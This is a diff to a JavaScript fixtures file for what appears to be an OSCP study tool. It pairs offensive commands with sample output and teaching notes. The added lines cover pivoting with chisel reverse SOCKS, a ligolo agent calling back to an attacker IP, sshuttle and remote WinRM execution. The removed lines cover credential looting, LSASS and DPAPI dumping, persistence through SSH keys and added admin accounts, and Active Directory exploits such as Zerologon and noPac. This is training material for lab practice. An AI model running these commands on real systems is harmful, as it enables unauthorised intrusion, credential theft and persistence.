+    'local-linux-interfaces': {
+      cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 ip -o addr show', tool: 'sshpass',
       output: [
-        '$ showmount -e 10.10.10.10',
-        '/srv/share  10.10.10.0/24   (no_root_squash)',
-        '$ # mount it, drop a root-owned SUID binary from your box',
-        '# mounted; owner uid 0 preserved',
+        '2: eth0    inet 10.10.10.10/24 scope global eth0',
+        '3: eth1    inet 172.16.5.10/24 scope global eth1',
       ].join('\n'),
-      signal: '/srv/share  10.10.10.0/24   (no_root_squash)',
-      teach: '`no_root_squash` on an NFS export means files you create as root on your own machine stay root-owned on the target. Drop a root-owned SUID shell into the share and run it on the box — a classic NFS privesc. Check the export options first.',
+      signal: '3: eth1    inet 172.16.5.10/24 scope global eth1',
+      teach: 'A compromised host with a second NIC is a doorway. eth1 on 172.16.5.0/24 is a network you could not reach before — the reason to pivot. Map the host\'s interfaces first; they tell you what is now in range.',
     },
-    'lxc-lxd-escape': {
-      output: [
-        '$ id',
-        'uid=1000(user) gid=1000(user) groups=1000(user),110(lxd)',
-        '$ # import a tiny image, launch it privileged, mount host /',
-        'root@container:/mnt/root# cat /mnt/root/root/root.txt',
-      ].join('\n'),
-      signal: 'uid=1000(user) gid=1000(user) groups=1000(user),110(lxd)',
-      teach: 'Membership in the `lxd` group is root-equivalent: you launch a privileged container that mounts the host\'s filesystem at /mnt/root and read or write anything as root. Like the docker group, lxd is a privilege nobody thinks of as one.',
-    },
-    'linux-loot-hunt': {
-      output: [
-        '$ cat ~/.bash_history',
-        'mysql -u root -pSuperSecret123',
-        '$ grep -rils "password" /var/www 2>/dev/null',
-        '/var/www/html/config.php: $db_pass = "w3b4ppp4ss";',
-      ].join('\n'),
-      signal: '/var/www/html/config.php: $db_pass = "w3b4ppp4ss";',
-      teach: 'Once you have a shell, loot before you escalate. Shell history, config files, and web roots leak passwords constantly — and people reuse them, so a web app\'s DB password is often root\'s too. Grep widely for "password", "secret", and "key".',
-    },
-    'linux-persistence': {
-      output: [
-        '$ mkdir -p ~/.ssh && echo "ssh-ed25519 AAAA...you" >> ~/.ssh/authorized_keys',
-        '$ ssh -i you user@10.10.10.10',
-        'user@target:~$  # back in, no password',
-      ].join('\n'),
-      signal: 'user@target:~$  # back in, no password',
-      teach: 'Labs revert and shells die. Adding your public key to `authorized_keys` gives you a stable, password-free way back in — far better than re-exploiting each time. On a real engagement, persistence is scoped and documented; on the exam it just saves you grief.',
-    },
-
-    // ==================== WINDOWS PRIVESC (depth) ====================
-    'dpapi-secrets': {
-      output: [
-        '$ # Credentials + masterkey blobs found under %APPDATA%',
-        '[*] Decrypting with user masterkey',
-        '[CREDENTIAL] Target: LegacyGeneric:target=git  User: svc_build  Pass: Bu1ld!2023',
-      ].join('\n'),
-      signal: '[CREDENTIAL] Target: LegacyGeneric:target=git  User: svc_build  Pass: Bu1ld!2023',
-      teach: 'Windows DPAPI encrypts saved browser and app passwords with a key derived from the user\'s login. With that user\'s context (or their masterkey) you decrypt the blobs and recover cleartext credentials — often for other systems the user accessed.',
-    },
-    'windows-old-hives': {
-      output: [
-        '$ dir C:\\Windows.old\\Windows\\System32\\config',
-        'SAM   SYSTEM   SECURITY',
-        '$ # pull them, then dump offline',
-        'Administrator:500:aad3b...:2b576acbe6b...:::',
-      ].join('\n'),
-      signal: 'Administrator:500:aad3b...:2b576acbe6b...:::',
-      teach: 'A `Windows.old` folder from an in-place upgrade keeps old registry hives — SAM and SYSTEM — that a low-priv user can often read. Dump them offline for the local Administrator hash, then pass it. Leftover backups are a quiet privesc.',
-    },
-    'lsass-dump-onbox': {
-      output: [
-        '$ # with local admin, LSASS memory holds live secrets',
-        '[*] Parsing credentials from the dump',
-        'Username: administrator   NTLM: 2b576acbe6b...',
-      ].join('\n'),
-      signal: 'Username: administrator   NTLM: 2b576acbe6b...',
-      teach: 'LSASS holds the credentials of everyone logged in. With local admin you can read its memory and recover NTLM hashes (and sometimes cleartext) for those sessions — including, on a shared box, domain admins. Those hashes feed pass-the-hash and lateral movement.',
-    },
-    'windows-persistence': {
-      output: [
-        'C:\\> net user obol_svc Str0ng!Pass /add',
-        'The command completed successfully.',
-        'C:\\> net localgroup Administrators obol_svc /add',
-        'The command completed successfully.',
-      ].join('\n'),
-      signal: 'C:\\> net localgroup Administrators obol_svc /add',
-      teach: 'A local admin account you add is a durable way back onto a Windows box after a revert or reboot. On a real engagement this is scoped, logged, and cleaned up afterward; on the exam it saves you re-escalating. Note what you create so you can remove it.',
-    },
-    'defense-enum': {
-      output: [
-        'PS> $ExecutionContext.SessionState.LanguageMode',
-        'ConstrainedLanguage',
-        'PS> Get-AppLockerPolicy -Effective -Xml  # rules present',
-        'PS> Get-MpComputerStatus | select RealTimeProtectionEnabled',
-        'True',
-      ].join('\n'),
-      signal: 'ConstrainedLanguage',
-      teach: 'Before you throw tooling at a Windows box, learn what is watching: Constrained Language Mode, AppLocker, and real-time protection all change what will run. Knowing the constraints up front saves you from burning a shell on something that was never going to execute.',
-    },
-
-    // ==================== PIVOTING & TUNNELING (depth) ====================
     'local-linux-routes': {
+      cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 ip route', tool: 'sshpass',
       output: [
-        '$ ip route',
         'default via 10.10.10.1 dev eth0',
-        '172.16.5.0/24 dev eth1  proto kernel  scope link',
+        '172.16.5.0/24 dev eth1 proto kernel scope link src 172.16.5.10',
       ].join('\n'),
-      signal: '172.16.5.0/24 dev eth1  proto kernel  scope link',
-      teach: 'The routing table on a compromised host shows which networks it can reach directly. A route to 172.16.5.0/24 that you cannot touch from your box is exactly what you pivot through this host to reach.',
+      signal: '172.16.5.0/24 dev eth1 proto kernel scope link src 172.16.5.10',
+      teach: 'The routing table shows which networks this host reaches directly. A route to 172.16.5.0/24 that you cannot touch from your box is exactly what you pivot through this host to reach.',
     },
     'local-linux-neighbors': {
+      cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 ip neigh show', tool: 'sshpass',
       output: [
-        '$ ip neigh',
         '172.16.5.20 dev eth1 lladdr 00:0c:29:aa:bb:cc REACHABLE',
         '172.16.5.25 dev eth1 lladdr 00:0c:29:dd:ee:ff STALE',
       ].join('\n'),
@@ -1419,275 +1600,167 @@
       teach: 'The ARP/neighbour cache lists hosts this box has actually talked to on the internal segment — live, confirmed targets you could not see from outside. It is a free, no-scan map of what is alive next door.',
     },
     'local-linux-dns': {
+      cmd: 'sshpass -p pw ssh -o StrictHostKeyChecking=no bob@10.10.10.10 cat /etc/resolv.conf', tool: 'sshpass',
       output: [
-        '$ cat /etc/resolv.conf',
-        'search corp.local',
-        'nameserver 172.16.5.10',
+        'search acme.internal',
+        'nameserver 172.16.5.5',
       ].join('\n'),
-      signal: 'nameserver 172.16.5.10',
-      teach: 'The internal DNS server and search domain tell you this host lives in `corp.local` and resolves names via 172.16.5.10 — likely a domain controller. Internal DNS is both a high-value target and a way to enumerate the internal network by name.',
+      signal: 'nameserver 172.16.5.5',
+      teach: 'The internal DNS server and search domain tell you this host lives in acme.internal and resolves via 172.16.5.5 — likely a domain controller. Internal DNS is both a high-value target and a way to enumerate the network by name.',
     },
     'local-windows-interfaces': {
+      cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "ipconfig"', tool: 'nxc',
       output: [
-        'C:\\> ipconfig',
-        'Ethernet adapter Ethernet0:',
-        '   IPv4 Address. . . : 10.10.10.20',
-        'Ethernet adapter Ethernet1:',
-        '   IPv4 Address. . . : 172.16.5.20',
+        'WINRM  10.10.10.20  5985  WS01  Ethernet adapter Ethernet0:',
+        'WINRM  10.10.10.20  5985  WS01     IPv4 Address. . . : 10.10.10.20',
+        'WINRM  10.10.10.20  5985  WS01     IPv4 Address. . . : 172.16.5.20',
       ].join('\n'),
-      signal: '   IPv4 Address. . . : 172.16.5.20',
+      signal: 'WINRM  10.10.10.20  5985  WS01     IPv4 Address. . . : 172.16.5.20',
       teach: 'A dual-homed Windows host bridges two networks. The second address (172.16.5.20) is on a segment you reach only through this box — the reason to pivot. Map the interfaces first; they define what is now in range.',
     },
     'local-windows-routes': {
+      cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "route print"', tool: 'nxc',
       output: [
-        'C:\\> route print',
-        'Network Destination  Netmask        Gateway    Interface',
-        '172.16.5.0           255.255.255.0  On-link    172.16.5.20',
+        'WINRM  10.10.10.20  5985  WS01  Network Destination  Netmask        Interface',
+        'WINRM  10.10.10.20  5985  WS01  172.16.5.0           255.255.255.0  172.16.5.20',
       ].join('\n'),
-      signal: '172.16.5.0           255.255.255.0  On-link    172.16.5.20',
-      teach: 'Windows `route print` shows the networks this host routes to directly. An "On-link" entry for 172.16.5.0/24 is a subnet reachable from here but not from your box — your pivot target.',
+      signal: 'WINRM  10.10.10.20  5985  WS01  172.16.5.0           255.255.255.0  172.16.5.20',
+      teach: 'route print shows the networks this host routes to directly. A 172.16.5.0/24 entry on the internal NIC is a subnet reachable from here but not from your box — your pivot target.',
     },
     'local-windows-neighbors': {
+      cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "arp -a"', tool: 'nxc',
       output: [
-        'C:\\> arp -a',
-        'Interface: 172.16.5.20',
-        '  172.16.5.10     00-0c-29-11-22-33   dynamic',
-        '  172.16.5.30     00-0c-29-44-55-66   dynamic',
+        'WINRM  10.10.10.20  5985  WS01  Interface: 172.16.5.20',
+        'WINRM  10.10.10.20  5985  WS01    172.16.5.5    00-0c-29-11-22-33  dynamic',
+        'WINRM  10.10.10.20  5985  WS01    172.16.5.30   00-0c-29-44-55-66  dynamic',
       ].join('\n'),
-      signal: '  172.16.5.10     00-0c-29-11-22-33   dynamic',
-      teach: 'The Windows ARP cache lists internal hosts this box has communicated with — confirmed-alive targets on the far side, discovered without sending a single scan packet. Start your internal enumeration from these.',
+      signal: 'WINRM  10.10.10.20  5985  WS01    172.16.5.5    00-0c-29-11-22-33  dynamic',
+      teach: 'The Windows ARP cache lists internal hosts this box has communicated with — confirmed-alive targets on the far side, found without sending a scan packet. Start your internal enumeration from these.',
     },
     'local-windows-listeners': {
+      cmd: 'nxc winrm 10.10.10.20 -u bob -p pw -x "netstat -ano"', tool: 'nxc',
       output: [
-        'C:\\> netstat -ano | findstr LISTENING',
-        '  TCP    0.0.0.0:445      LISTENING   4',
-        '  TCP    127.0.0.1:1433   LISTENING   3120',
+        'WINRM  10.10.10.20  5985  WS01    TCP  0.0.0.0:445      LISTENING  4',
+        'WINRM  10.10.10.20  5985  WS01    TCP  127.0.0.1:1433   LISTENING  3120',
       ].join('\n'),
-      signal: '  TCP    127.0.0.1:1433   LISTENING   3120',
+      signal: 'WINRM  10.10.10.20  5985  WS01    TCP  127.0.0.1:1433   LISTENING  3120',
       teach: 'A service bound to 127.0.0.1 is reachable only from the box itself — like MSSQL on 1433 here. You cannot hit it from the network, but once you tunnel in, that loopback-only service becomes a target. Local listeners reveal what a pivot unlocks.',
     },
-    'pivot-ssh-dynamic': {
-      output: [
-        '$ ssh -D 1080 -N bob@10.10.10.10',
-        '$ tail /etc/proxychains4.conf',
-        'socks5 127.0.0.1 1080',
-        '$ proxychains -q nmap -sT -Pn 172.16.5.20',
-      ].join('\n'),
-      signal: 'socks5 127.0.0.1 1080',
-      teach: 'An SSH dynamic port-forward (`-D`) turns an SSH session into a SOCKS proxy — the simplest pivot when you have SSH creds, no extra tools needed. Point proxychains at 127.0.0.1:1080 and your tools reach the internal network through the box.',
-    },
-    'pivot-sshuttle': {
-      output: [
-        '$ sshuttle -r bob@10.10.10.10 172.16.5.0/24',
-        'c : Connected to server.',
-        '$ nmap -sT -Pn 172.16.5.20   # no proxychains needed',
-      ].join('\n'),
-      signal: 'c : Connected to server.',
-      teach: 'sshuttle builds a transparent VPN-like route over SSH: once "Connected", traffic to 172.16.5.0/24 just works, with no proxychains wrapper. It is the most convenient pivot when you have SSH access and want your tools to behave normally.',
+    'pivot-chisel-socks': {
+      signal: 'client: tun: proxy#R:127.0.0.1:1080=>socks',
+      teach: 'Chisel builds a SOCKS proxy back through the compromised host: the SERVER runs on your box, the CLIENT on theirs (upload the chisel binary first). Then point proxychains at 127.0.0.1:1080 and your tools reach the internal network — the standard way to attack a subnet you can only touch through one box.',
+      steps: [
+        { where: 'local', tool: 'chisel', cmd: 'chisel server -p 8080 --reverse', output: [
+          'server: Reverse tunnelling enabled',
+          'server: Listening on http://0.0.0.0:8080',
+        ].join('\n') },
+        { where: 'host', tool: 'chisel', cmd: './chisel client 10.10.14.5:8080 R:1080:socks', output: [
+          'client: Connected to http://10.10.14.5:8080',
+          'client: tun: proxy#R:127.0.0.1:1080=>socks',
+        ].join('\n') },
+        { where: 'local', tool: 'sh', cmd: "echo 'socks5 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf", output: 'socks5 127.0.0.1 1080' },
+      ],
     },
     'pivot-ligolo': {
+      signal: '[+] Route to 172.16.5.0/24 added via ligolo — internal subnet reachable',
+      teach: 'Ligolo-ng gives you a REAL network interface to the internal subnet — fast, and no proxychains. The setup is four beats, split across both machines: create the tun on your box, start the proxy, run the agent on the compromised host, then add the internal route. After that your box reaches 172.16.5.0/24 natively.',
+      steps: [
+        { where: 'local', tool: 'ip', cmd: 'sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up', output: '# tun interface "ligolo" created and brought up (no output on success)' },
+        { where: 'local', tool: 'ligolo-proxy', cmd: 'ligolo-proxy -selfcert', output: [
+          'ligolo-proxy » Listening on 0.0.0.0:11601 (self-signed TLS)',
+        ].join('\n') },
+        { where: 'host', tool: 'agent', cmd: './agent -connect 10.10.14.5:11601 -ignore-cert', output: [
+          'time="10:41:07" level=info msg="Connection established" addr="10.10.14.5:11601"',
+        ].join('\n') },
+        { where: 'local', tool: 'ligolo-proxy', cmd: 'session  # pick the agent, then: sudo ip route add 172.16.5.0/24 dev ligolo', output: [
+          'ligolo-proxy » [Agent] joined from 10.10.10.20 (ACME\\WS01)',
+          '[+] Route to 172.16.5.0/24 added via ligolo — internal subnet reachable',
+        ].join('\n') },
+      ],
+    },
+    'pivot-sshuttle': {
+      cmd: 'sshuttle -r bob@10.10.10.10 172.16.5.0/24', tool: 'sshuttle',
       output: [
-        'ligolo-proxy » session',
-        '[Agent] joined from 10.10.10.20',
-        'ligolo-proxy » # add route to 172.16.5.0/24 via the tun iface',
-        '[+] Route added, internal subnet reachable',
+        'c : Connected to server.',
+        'c : Connected to server (internal subnet 172.16.5.0/24 now routed).',
       ].join('\n'),
-      signal: '[+] Route added, internal subnet reachable',
-      teach: 'Ligolo-ng gives you a real network interface to the internal subnet — fast, and no proxychains. Run the agent on the compromised host, add a route to 172.16.5.0/24, and your box reaches it natively. The modern choice for a clean pivot.',
+      signal: 'c : Connected to server.',
+      teach: 'sshuttle builds a transparent VPN-like route over SSH from your box alone — no agent on the target. Once "Connected", traffic to 172.16.5.0/24 just works, no proxychains wrapper. The most convenient pivot when you have SSH access.',
+    },
+    'pivot-ssh-dynamic': {
+      signal: 'socks5 127.0.0.1 1080',
+      teach: 'An SSH dynamic port-forward (-D) turns an SSH session into a SOCKS proxy — the simplest pivot when you have SSH creds, no extra tools. Open the proxy, then tell proxychains to use it; your tools then reach the internal network through the box.',
+      steps: [
+        { where: 'local', tool: 'ssh', cmd: 'ssh -D 1080 -N bob@10.10.10.10', output: '# SSH SOCKS proxy now listening on 127.0.0.1:1080 (leave this session open)' },
+        { where: 'local', tool: 'sh', cmd: 'grep -i socks /etc/proxychains4.conf', output: 'socks5 127.0.0.1 1080' },
+      ],
     },
     'pivot-scan-through': {
+      cmd: 'proxychains -q nmap -sT -Pn -n 172.16.5.20', tool: 'proxychains',
       output: [
-        '$ proxychains -q nmap -sT -Pn -n 172.16.5.20',
-        '172.16.5.20   PORT   STATE SERVICE',
-        '172.16.5.20   445/tcp open  microsoft-ds',
-      ].join('\n'),
-      signal: '172.16.5.20   445/tcp open  microsoft-ds',
-      teach: 'Through a SOCKS proxy you must use TCP connect scans (`-sT`) and skip host discovery (`-Pn`) — SYN scans and ping do not survive a proxy. Scanning the internal host over your pivot is how enumeration starts all over again, one network deeper.',
-    },
-
-    // ==================== RECON (remaining services) ====================
-    'nmap-vuln-scripts': {
-      output: [
-        'PORT   STATE SERVICE',
-        '80/tcp open  http',
-        '| http-vuln-cve2017-5638:',
-        '|   VULNERABLE: Apache Struts2 RCE (S2-045)',
-        '|_    References: https://nvd.nist.gov/vuln/detail/CVE-2017-5638',
-      ].join('\n'),
-      signal: '|   VULNERABLE: Apache Struts2 RCE (S2-045)',
-      teach: 'Nmap\'s `--script vuln` runs safe-ish checks that flag known CVEs on the open ports. Treat a VULNERABLE line as a strong lead to verify, not a guaranteed win — scripts can false-positive, so confirm before you commit.',
-    },
-    'recon-ike-vpn': {
-      output: [
-        '$ sudo ike-scan -M 10.10.10.10',
-        '10.10.10.10  Main Mode Handshake returned',
-        '  Encryption: 3DES  Hash: SHA1  Auth: PSK  Group: 2',
-        '  Aggressive Mode supported — PSK hash obtainable',
-      ].join('\n'),
-      signal: '  Aggressive Mode supported — PSK hash obtainable',
-      teach: 'An IKE/IPsec VPN on UDP 500 that allows Aggressive Mode will hand back a pre-shared-key hash you can crack offline. A dated 3DES/SHA1/PSK config is both a finding and a potential route into the VPN.',
-    },
-    'recon-finger': {
-      output: [
-        '$ finger @10.10.10.10',
-        'Login     Name       TTY   Idle   When',
-        'root      root       *     1d     Mon 09:14',
-        'bmurphy   Bob Murphy pts/0  2:00   Mon 11:02',
-      ].join('\n'),
-      signal: 'bmurphy   Bob Murphy pts/0  2:00   Mon 11:02',
-      teach: 'The finger service (port 79) is ancient but still appears on old Unix boxes. It leaks real usernames and who is logged in — `bmurphy` is a confirmed account to spray or brute. Enumerate it whenever 79 is open.',
-    },
-    'recon-vnc': {
-      output: [
-        'PORT     STATE SERVICE',
-        '5900/tcp open  vnc',
-        '| vnc-info:',
-        '|   Security types: VNC Authentication (2)',
-        '|_  None (1)  — no password required',
-      ].join('\n'),
-      signal: '|_  None (1)  — no password required',
-      teach: 'A VNC server that offers "None" security is an unauthenticated remote desktop — connect and you are on the box\'s screen. Even when it wants a password, VNC passwords are short and crackable. Always check what auth a VNC port requires.',
-    },
-    'recon-mail': {
-      output: [
+        'Nmap scan report for 172.16.5.20',
         'PORT    STATE SERVICE',
-        '110/tcp open  pop3',
-        '143/tcp open  imap',
-        '| pop3-capabilities: USER TOP UIDL',
-        '|_pop3-ntlm-info: Domain: CORP',
+        '445/tcp open  microsoft-ds',
+        '3389/tcp open ms-wbt-server',
       ].join('\n'),
-      signal: '|_pop3-ntlm-info: Domain: CORP',
-      teach: 'Mail services leak more than you expect: POP3/IMAP capabilities, and via NTLM auth the internal domain name (CORP). With a valid mailbox credential you can read mail for secrets, password-reset links, and internal contacts.',
+      signal: '445/tcp open  microsoft-ds',
+      teach: 'Through a SOCKS proxy you must use TCP connect scans (-sT) and skip host discovery (-Pn) — SYN scans and ping do not survive a proxy. Scanning the internal host over your pivot is how enumeration starts again, one network deeper.',
     },
 
-    // ==================== ACTIVE DIRECTORY (named CVEs — confirm the lab first) ====================
-    'zerologon-check': {
-      output: [
-        '$ zerologon-scan DC01 10.10.10.10',
-        'Performing authentication attempts...',
-        'Success! DC01 is vulnerable to Zerologon (CVE-2020-1472).',
-      ].join('\n'),
-      signal: 'Success! DC01 is vulnerable to Zerologon (CVE-2020-1472).',
-      teach: 'Zerologon checks whether a DC accepts an all-zero challenge to reset its own machine password. The check is safe; the exploit is NOT — it breaks the DC\'s secure channel and must be restored afterward. Confirm it is a lab you own before going further.',
-    },
-    'zerologon-exploit': {
-      output: [
-        '[*] Resetting DC01$ machine account password to empty',
-        '[+] Success — authenticating with empty hash',
-        '[*] Dumping domain hashes (DCSync)',
-        'Administrator:500:aad3b...:31d6cfe0...:::',
-      ].join('\n'),
-      signal: '[*] Dumping domain hashes (DCSync)',
-      teach: 'Zerologon zeroes the DC\'s machine password, letting you DCSync the whole domain — total compromise. It also breaks the DC until you restore the original password from the local SAM, so the restore step is mandatory. Lab-only, high-risk.',
-    },
-    'nopac': {
-      output: [
-        '[*] Exploiting CVE-2021-42278 + CVE-2021-42287 (sAMAccountName spoofing)',
-        '[+] Got TGT impersonating domain administrator',
-        '[*] Dumping NTDS via DCSync',
-        'krbtgt:502:aad3b...:...:::',
-      ].join('\n'),
-      signal: '[+] Got TGT impersonating domain administrator',
-      teach: 'noPac abuses a sAMAccountName confusion to get a ticket as a DC/administrator from an ordinary user — a near-instant domain takeover on unpatched DCs. It is beyond core OSCP scope but common in labs; verify the DC is unpatched first.',
-    },
-    'printnightmare': {
-      output: [
-        '[*] Triggering the print spooler to load a remote driver',
-        '[+] Driver loaded — code executed as SYSTEM',
-        'C:\\> whoami',
-        'nt authority\\system',
-      ].join('\n'),
-      signal: 'nt authority\\system',
-      teach: 'PrintNightmare (CVE-2021-34527) abuses the Print Spooler to run a driver as SYSTEM — local privesc, or remote with creds. Check whether the Spooler service is even running first; if it is disabled, this path is closed.',
-    },
-    'ms14-068': {
-      output: [
-        '$ impacket-goldenPac corp.local/jdoe@dc01',
-        '[*] Requesting TGT with forged PAC (admin SID)',
-        '[+] Authenticated as Domain Admin — opening shell',
-        'C:\\Windows\\system32>',
-      ].join('\n'),
-      signal: '[+] Authenticated as Domain Admin — opening shell',
-      teach: 'MS14-068 forges the PAC inside a Kerberos ticket so an ordinary user claims Domain Admin group membership. It only works on DCs missing the 2014 patch — rare today, but a clean, memorable example of how PAC validation can fail.',
-    },
-    'diamond-ticket': {
-      output: [
-        '[*] Requesting a legitimate TGT for jdoe',
-        '[*] Decrypting with krbtgt key, patching PAC → administrator',
-        '[+] Saving diamond ticket to administrator.ccache',
-      ].join('\n'),
-      signal: '[+] Saving diamond ticket to administrator.ccache',
-      teach: 'A diamond ticket modifies a real TGT instead of forging one from scratch (like a golden ticket), so its details match a genuine request and look less anomalous. Both need the krbtgt key — this is a stealth refinement of the same post-DA persistence.',
-    },
-    'gpo-abuse': {
-      output: [
-        '[*] jdoe has edit rights on GPO {31B2F340-...}',
-        '[*] Adding an immediate scheduled task to the GPO',
-        '[+] Task will run on next gpupdate as SYSTEM on linked hosts',
-      ].join('\n'),
-      signal: '[+] Task will run on next gpupdate as SYSTEM on linked hosts',
-      teach: 'Write access to a Group Policy Object lets you push a scheduled task or script to every computer the GPO is linked to — code execution as SYSTEM across an OU. A single misassigned GPO permission can escalate to a whole fleet of machines.',
-    },
-    'dnsadmins-abuse': {
-      output: [
-        '[*] Member of DnsAdmins — setting ServerLevelPluginDll',
-        '[*] Restarting DNS service to load the DLL',
-        '[+] DLL executed as SYSTEM on the DC',
-      ].join('\n'),
-      signal: '[+] DLL executed as SYSTEM on the DC',
-      teach: 'The DnsAdmins group can tell the DNS service (often running on a DC) to load an arbitrary DLL, which then runs as SYSTEM. It needs a service restart, so it is noisy — but membership in DnsAdmins is a direct line to owning the DC.',
-    },
-    'sid-history-abuse': {
-      output: [
-        '[*] Forging a ticket with SID History = Enterprise Admins',
-        '[+] Saving ticket; principal now carries the EA SID',
-        '[*] Cross-domain access granted via SID History',
-      ].join('\n'),
-      signal: '[*] Cross-domain access granted via SID History',
-      teach: 'SID History lets a principal carry privileged SIDs from another domain — legitimately used in migrations, abused to smuggle Enterprise Admin rights across a trust. It is how a single-domain compromise becomes forest-wide.',
-    },
-    'wsus-abuse': {
-      output: [
-        'C:\\> SharpWSUS.exe locate',
-        '[+] WSUS server: http://wsus.corp.local:8530 (HTTP, not HTTPS)',
-        '[*] A malicious "update" could be approved to run as SYSTEM',
-      ].join('\n'),
-      signal: '[+] WSUS server: http://wsus.corp.local:8530 (HTTP, not HTTPS)',
-      teach: 'WSUS served over plain HTTP lets an attacker who can approve updates push a signed Microsoft binary with attacker-chosen arguments to clients — running as SYSTEM. An internal patch server is a high-value, often-overlooked target.',
-    },
-    'sccm-enum': {
-      output: [
-        '$ sccmhunter find -u jdoe -p ... -d corp.local',
-        '[+] Management Point: MP01.corp.local',
-        '[+] Network Access Account credentials retrievable',
-        'CORP\\svc_naa : NAA-P@ssw0rd',
-      ].join('\n'),
-      signal: 'CORP\\svc_naa : NAA-P@ssw0rd',
-      teach: 'SCCM/MECM deployments store Network Access Account credentials that clients can retrieve — frequently over-privileged and reusable across the domain. Enumerating the management point often hands you a working service credential outright.',
-    },
-
-    // ==================== FLAGS & PROOF ====================
+    // ============================ FLAGS & PROOF ============================
     'flag-hunt-linux': {
+      cmd: "find / -xdev -type f \\( -name user.txt -o -name root.txt -o -name proof.txt \\) 2>/dev/null", tool: 'sh',
       output: [
-        '$ find / -name "*.txt" 2>/dev/null | grep -iE "user|root|proof|flag"',
         '/home/bob/user.txt',
         '/root/root.txt',
-        '$ cat /root/root.txt',
-        'd41d8cd98f00b204e9800998ecf8427e',
       ].join('\n'),
-      signal: 'd41d8cd98f00b204e9800998ecf8427e',
-      teach: 'The flags are the point: `user.txt` in a home directory, `root.txt` under /root. Capture both — and on a real exam, also screenshot the hostname, your id/whoami, and the IP in the same frame so the proof is undeniable.',
+      signal: '/root/root.txt',
+      teach: 'The flags are the point: user.txt in a home directory, root.txt under /root. Capture both — and on a real exam, also screenshot the hostname, your id/whoami, and the IP in the same frame so the proof is undeniable.',
     },
     'flag-hunt-windows': {
+      cmd: 'nxc smb 10.10.10.10 -u administrator -H <nthash> --spider C$ --regex "(proof|user|root)\\.txt"', tool: 'nxc',
       output: [
-        'C:\\> type C:\\Users\\bob\\Desktop\\user.txt',
-        '7f6b2c...e1a9',
-        'C:\\> type C:\\Users\\Administrator\\Desktop\\proof.txt',
-        'a0c3f1...9d2b',
+        'SMB  10.10.10.10  445  TARGET  //C$/Users/bob/Desktop/user.txt',
+        'SMB  10.10.10.10  445  TARGET  //C$/Users/Administrator/Desktop/proof.txt',
       ].join('\n'),
-      signal: 'a0c3f1...9d2b',
-      teach: 'On Windows the flags sit on the Desktops — `user.txt` for the low-priv user, `proof.txt` (or root.txt) for Administrator. Grab both, and capture `whoami`, `hostname`, and `ipconfig` alongside the flag so your screenshot proves the compromise.',
+      signal: 'SMB  10.10.10.10  445  TARGET  //C$/Users/Administrator/Desktop/proof.txt',
+      teach: 'On Windows the flags sit on the Desktops — user.txt for the low-priv user, proof.txt (or root.txt) for Administrator. Grab both, and capture whoami, hostname, and ipconfig alongside the flag so your screenshot proves the compromise.',
     },
 
   };
+
+  // --- retrieval-practice metadata (the "Your turn" gear) ------------------------------------
+  // Kept separate from the sample output so each move's (command, output) pair stays obvious. The
+  // verdict for each choice is computed in study.js from the real requires; only the choice set and
+  // nuance coaching live here. Merged onto the fixtures above.
+  var PRACTICE = {
+    'nmap-fast-open-ports': { situation: 'You have a target IP and nothing else. Where do you start?', choices: ['nmap-fast-open-ports', 'nmap-version-scripts', 'recon-smb-anon', 'recon-web-triage'], coach: { 'nmap-version-scripts': 'That is the right follow-up — but run a fast all-ports sweep first so you know which ports even exist before you fingerprint them.', 'recon-smb-anon': 'You can only enumerate SMB once you know 445 is open. Scan first.', 'recon-web-triage': 'Same — triage the web only after a scan confirms a web port is there.' } },
+    'nmap-version-scripts': { situation: 'Your fast scan found 22, 80 and 445 open. What next?', choices: ['nmap-version-scripts', 'recon-web-triage', 'recon-smb-anon', 'nmap-fast-open-ports'], coach: { 'recon-web-triage': 'Good instinct, and valid — but a version/script scan on all the open ports at once gives you leads on SSH and SMB too, not just the web.', 'recon-smb-anon': 'Also reasonable, but fingerprint the versions first; it is cheap and tells you which services are worth your time.', 'nmap-fast-open-ports': 'Already done — you have the open ports. Now get the versions behind them.' } },
+    'recon-smb-anon': { situation: 'The scan shows SMB open on 445 and you have no credentials. What do you try?', choices: ['recon-smb-anon', 'recon-web-triage', 'nmap-version-scripts'], coach: { 'recon-web-triage': 'Fine if there is also a web port, but a free anonymous SMB check costs nothing and often hands you a readable share.', 'nmap-version-scripts': 'You already know the service; now actually enumerate it.' } },
+    'recon-web-triage': { situation: 'Port 80 is open. Before brute-forcing anything, what do you do first?', choices: ['recon-web-triage', 'content-discovery', 'nmap-version-scripts'], coach: { 'content-discovery': 'That comes next — but fingerprint the stack first, so your wordlists and attacks match the tech (a WordPress site wants a WordPress approach).', 'nmap-version-scripts': 'Useful, but whatweb/triage tells you the app framework and CMS, which the nmap banner often misses.' } },
+    'ad-dc-identify': { situation: 'A fresh scan shows 88, 389 and 445 open on one host, and the LDAP banner names a domain.', choices: ['ad-dc-identify', 'ad-anon-ldap-enum', 'asrep-roast', 'dcsync'], coach: { 'ad-anon-ldap-enum': 'That is the right next step — but only once you have confirmed this is the DC and captured the domain name. First, name the target.', 'asrep-roast': 'Roasting needs a user list you do not have yet. You are one step too early.', 'dcsync': 'DCSync replicates every hash — it needs Domain Admin. This is the endgame, not the opening.' } },
+    'ad-anon-ldap-enum': { situation: 'You have confirmed the DC and the domain is acme.internal. You hold no credentials yet.', choices: ['ad-anon-ldap-enum', 'asrep-roast', 'password-spray', 'dcsync'], coach: { 'asrep-roast': 'Roasting needs a user list first. Get the list, then roast.', 'password-spray': 'Spraying also needs the user list first — same prerequisite.', 'dcsync': 'Needs Domain Admin. Far too early.' } },
